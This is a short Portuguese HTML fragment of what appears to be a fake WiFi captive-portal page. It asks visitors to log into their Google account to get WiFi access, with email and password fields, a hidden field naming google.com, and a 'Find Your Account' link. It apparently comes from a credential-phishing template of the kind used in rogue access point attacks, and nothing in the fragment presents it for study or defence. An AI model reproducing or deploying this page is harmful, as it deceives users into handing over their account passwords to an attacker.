...
<div class='banner'>
<h1>
Logue Sua Conta Do Google Para Entrar No Wifi
</h1>
...
<br>
<input type='email' placeholder='Coloque Seu Email' name='user' required />
<input type='password' placeholder='Coloque Sua Senha' name='pass' required />
<input type='hidden' name='url' value='google.com'>
<button type='submit'>Login</button>
<p class='message'><a href='#'>Encontre Sua Conta</a></p>
</form>
</div>
</div>
